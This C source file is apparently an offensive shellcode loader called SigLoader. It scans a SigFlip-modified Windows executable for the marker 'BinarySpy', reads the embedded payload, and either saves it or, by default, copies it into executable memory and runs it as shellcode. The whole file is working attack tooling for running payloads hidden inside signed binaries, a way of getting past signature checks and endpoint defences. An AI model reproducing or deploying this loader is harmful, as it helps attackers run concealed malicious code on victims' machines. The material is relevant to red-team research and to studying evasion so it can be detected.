/*
 * SigLoader - Minimal loader for extracting embedded data from SigFlip-modified PE
 * Compile: gcc -o SigLoader.exe SigLoader.c
 * Usage: SigLoader.exe <modified_pe> [output.bin]
 */
#include <windows.h>
#include <stdio.h>

#define MAGIC_TAG "BinarySpy"

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <pe_file> [output.bin]\n", argv[0]);
        return 1;
    }

    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, 
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Cannot open file: %s\n", argv[1]);
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *data = (BYTE*)malloc(fileSize);
    DWORD read;
    ReadFile(hFile, data, fileSize, &read, NULL);
    CloseHandle(hFile);

    // Find magic tag
    BYTE *magic = (BYTE*)MAGIC_TAG;
    int magicLen = strlen(MAGIC_TAG);
    BYTE *found = NULL;
    
    for (DWORD i = 0; i < fileSize - magicLen - 4; i++) {
        if (memcmp(data + i, magic, magicLen) == 0) {
            found = data + i;
            break;
        }
    }

    if (!found) {
        printf("[!] Magic tag not found\n");
        free(data);
        return 1;
    }

    // Read size (4 bytes after magic tag)
    DWORD dataSize = *(DWORD*)(found + magicLen);
    BYTE *payload = found + magicLen + 4;

    printf("[+] Found data at offset: 0x%X\n", (DWORD)(found - data));
    printf("[+] Data size: %d bytes\n", dataSize);

    // Save to file or execute
    if (argc >= 3) {
        HANDLE hOut = CreateFileA(argv[2], GENERIC_WRITE, 0, NULL, 
                                  CREATE_ALWAYS, 0, NULL);
        if (hOut != INVALID_HANDLE_VALUE) {
            WriteFile(hOut, payload, dataSize, &read, NULL);
            CloseHandle(hOut);
            printf("[+] Saved to: %s\n", argv[2]);
        }
    } else {
        // Execute as shellcode
        printf("[*] Executing shellcode...\n");
        void *exec = VirtualAlloc(NULL, dataSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        memcpy(exec, payload, dataSize);
        ((void(*)())exec)();
    }

    free(data);
    return 0;
}